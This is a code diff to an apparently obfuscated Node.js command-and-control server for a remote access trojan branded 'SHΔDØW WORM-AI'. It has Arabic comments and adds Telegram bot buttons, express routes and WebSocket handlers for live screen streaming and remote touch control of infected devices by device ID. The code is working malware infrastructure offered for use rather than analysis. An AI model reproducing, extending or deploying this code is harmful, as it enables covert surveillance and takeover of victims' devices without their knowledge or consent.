@@ -1,17 +1,13 @@
 // ================================================== //
-// ========== SHΔDØW WORM-AI💀🔥 LIVE STREAM ========== //
-// ==========      إضافات البث المباشر     ========== //
-// ==========    مدمجة مع السيرفر الأصلي   ========== //
+// ========== SHΔDØW WORM-AI💀🔥 ULTIMATE ============ //
+// ==========      الإصدار النهائي المتكامل   ========== //
 // ================================================== //
 
 const path = require('path');
 const os = require('os');
 
 // تخزين جلسات البث النشطة
-const activeStreams = new Map(); // deviceId -> { socket, clients, lastFrame, screenInfo }
-
-// ========== إنشاء مجلد public إذا لم يكن موجوداً ========== //
-const publicDir = path.join(__dirname, 'public');
+const activeStreams = new Map();
 
 // ========== صفحة المشاهدة المباشرة ========== //
 const viewerHTML = `<!DOCTYPE html>
@@ -354,7 +350,7 @@ const viewerHTML = `<!DOCTYPE html>
 </body>
 </html>`;
 
-console.log('✅ SHΔDØW WORM-AI💀🔥 Live Stream Page Loaded');
+console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION LOADED');
 console.log('='.repeat(50));
 
 // ================================================== //
@@ -959,15 +955,14 @@ const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Se
         _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯'
     ];
 
-// ========== إضافة مسار public بعد تعريف fs ========== //
+// ========== إضافة المسارات والملفات ========== //
+const publicDir = path.join(__dirname, 'public');
 if (!fs.existsSync(publicDir)) {
     fs.mkdirSync(publicDir, { recursive: true });
 }
-
-// ========== حفظ صفحة المشاهدة ========== //
 fs.writeFileSync(path.join(publicDir, 'viewer.html'), viewerHTML);
 
-// ========== إضافة Routes للبث المباشر في نفس السيرفر ========== //
+// ========== إضافة مسار البث المباشر ========== //
 app.get('/control/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     
@@ -1012,7 +1007,6 @@ app.get('/control/:deviceId', (req, res) => {
 // ========== إضافة Endpoints للبث ========== //
 app.post('/stream/start', express.json(), (req, res) => {
     const { deviceId, screenWidth, screenHeight } = req.body;
-    
     const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
     
     res.json({
@@ -1067,7 +1061,7 @@ app.post('/stream/touch/:deviceId', express.json(), (req, res) => {
     }
 });
 
-// ========== إضافة أوامر البوت الجديدة ========== //
+// ========== أوامر البوت الجديدة ========== //
 bot.onText(/\/live (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const deviceId = match[1];
@@ -1194,8 +1188,8 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
                 }), _0x520b32[_0x3c5d98(0x278)](_0x41751b), _0x41751b = []);
         });
         
-        // ===== إضافة الأزرار الجديدة هنا =====
-        // إضافة أزرار البث المباشر إلى القائمة
+        // ========== الأزرار الجديدة - مضافة بشكل دائم ========== //
+        // إضافة صف جديد للأزرار الجديدة
         _0x520b32.push([
             {
                 text: '📺 بث مباشر',
@@ -1211,7 +1205,7 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
             text: '🖱️ تحكم عن بعد',
             callback_data: _0x444e7d + '|remote'
         }]);
-        // ===== نهاية إضافة الأزرار الجديدة =====
+        // ========== نهاية الأزرار الجديدة ========== //
         
         _0x520b32.push([{
             'text': _0x25dd5e[_0x5acb82(0x31f)],
@@ -1226,7 +1220,6 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
     });
     
     // ========== إضافات البث المباشر في WebSocket ========== //
-    // التعامل مع البث المباشر
     _0x5c13cb.on('stream-connect', (data) => {
         const deviceId = _0x444e7d;
         const { screenWidth, screenHeight } = data;
@@ -2267,3 +2260,79 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
     const _0x8ee2dc = _0x286428, _0x10d5ed = { 'hDJBw': _0x8ee2dc(0x334) + _0x8ee2dc(0x1f4) + '00' };
     console[_0x8ee2dc(0x3b1)](_0x10d5ed[_0x8ee2dc(0x2de)]);
 });
+
+// ========== معالجة أوامر الكول باك للأزرار الجديدة ========== //
+bot.on('callback_query', (query) => {
+    const data = query.data;
+    const chatId = query.message.chat.id;
+    const messageId = query.message.message_id;
+    
+    if (data.includes('|live')) {
+        const deviceId = data.split('|')[0];
+        bot.answerCallbackQuery(query.id, { text: 'جاري تجهيز البث المباشر...' });
+        
+        if (activeStreams.has(deviceId)) {
+            const stream = activeStreams.get(deviceId);
+            const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
+            
+            bot.sendMessage(chatId, 
+                `🔴 <b>الجهاز ${deviceId} يبث مباشرة</b>\n\n` +
+                `🌐 <b>رابط المشاهدة:</b>\n` +
+                `<code>${streamUrl}</code>\n\n` +
+                `📱 <b>معلومات الشاشة:</b>\n` +
+                `الأبعاد: ${stream.screenInfo.width || '?'}x${stream.screenInfo.height || '?'}\n` +
+                `آخر تحديث: ${Math.floor((Date.now() - stream.lastFrameTime) / 1000)} ثانية\n\n` +
+                `👁 <b>المشاهدين:</b> ${stream.clients.size}`,
+                { parse_mode: 'HTML' }
+            );
+        } else {
+            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} لا يبث حالياً`, { parse_mode: 'HTML' });
+        }
+    }
+    
+    else if (data.includes('|streams')) {
+        const deviceId = data.split('|')[0];
+        bot.answerCallbackQuery(query.id, { text: 'جاري عرض البثوث النشطة...' });
+        
+        const devices = Array.from(activeStreams.keys());
+        if (devices.length > 0) {
+            let message = '<b>🔴 الأجهزة التي تبث حالياً:</b>\n\n';
+            devices.forEach(id => {
+                const stream = activeStreams.get(id);
+                message += `📱 <b>${id}</b>\n`;
+                message += `   👁 المشاهدين: ${stream.clients.size}\n`;
+                message += `   📺 ${stream.screenInfo.width || '?'}x${stream.screenInfo.height || '?'}\n`;
+                message += `   🔗 /live ${id}\n\n`;
+            });
+            bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+        } else {
+            bot.sendMessage(chatId, '❌ لا توجد بثوث نشطة حالياً', { parse_mode: 'HTML' });
+        }
+    }
+    
+    else if (data.includes('|remote')) {
+        const deviceId = data.split('|')[0];
+        bot.answerCallbackQuery(query.id, { text: 'جاري تجهيز التحكم عن بعد...' });
+        
+        if (activeStreams.has(deviceId)) {
+            const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
+            
+            bot.sendMessage(chatId, 
+                `🖱️ <b>التحكم عن بعد - الجهاز ${deviceId}</b>\n\n` +
+                `🌐 <b>رابط التحكم:</b>\n` +
+                `<code>${streamUrl}</code>\n\n` +
+                `📱 <b>تعليمات:</b>\n` +
+                `• انقر على الشاشة للتحكم باللمس\n` +
+                `• استخدم الأزرار للسحب والضغط الطويل\n` +
+                `• حرك الماوس لمشاهدة الإحداثيات`,
+                { parse_mode: 'HTML' }
+            );
+        } else {
+            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل للبث`, { parse_mode: 'HTML' });
+        }
+    }
+});
+
+console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION - ALL FEATURES ACTIVATED');
+console.log('✅ الأزرار الجديدة: 📺 بث مباشر, 📡 البثوث النشطة, 🖱️ تحكم عن بعد');
+console.log('='.repeat(50));
